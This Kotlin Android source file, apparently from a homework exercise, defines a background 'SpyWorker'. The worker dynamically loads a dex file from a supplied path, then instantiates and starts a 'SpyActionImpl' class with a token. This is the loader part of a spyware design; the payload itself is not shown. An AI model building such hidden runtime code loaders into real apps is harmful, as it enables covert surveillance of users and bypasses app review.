package com.homework.myapplication.presentation

import android.content.Context
import android.content.Context.MODE_PRIVATE
import androidx.work.CoroutineWorker
import androidx.work.Data
import androidx.work.WorkerParameters
import dalvik.system.DexClassLoader
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class SpyWorker(appContext: Context, workerParameters: WorkerParameters) :
    CoroutineWorker(appContext, workerParameters) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        val dexInternalStoragePath =
            inputData.getString(PATH_KEY) ?: return@withContext Result.failure()
        val token = inputData.getString(TOKEN_KEY) ?: return@withContext Result.failure()
        val optimizedDexOutputPath = applicationContext.getDir("outdex", MODE_PRIVATE)
        val loader = DexClassLoader(
            dexInternalStoragePath,
            optimizedDexOutputPath.absolutePath,
            null,
            javaClass.classLoader
        )
        val startSpyLoader = loader.loadClass(CLASS_NAME)
        try {
            val startSpy = startSpyLoader.newInstance()
            if (startSpy is SpyAction) {
                startSpy.startAction(token)
            }
        } catch (e: Exception) {
            e.printStackTrace()
            Data.Builder()
                .putString(KEY_OUTPUT, e.message)
                .build()
        }
        Result.success()
    }

    companion object {
        private const val KEY_OUTPUT: String = "key_output"
        private const val CLASS_NAME = "com.homework.myapplication.spyservice.SpyActionImpl"
        const val PATH_KEY = "PATH"
        const val TOKEN_KEY = "TOKEN"
    }
}
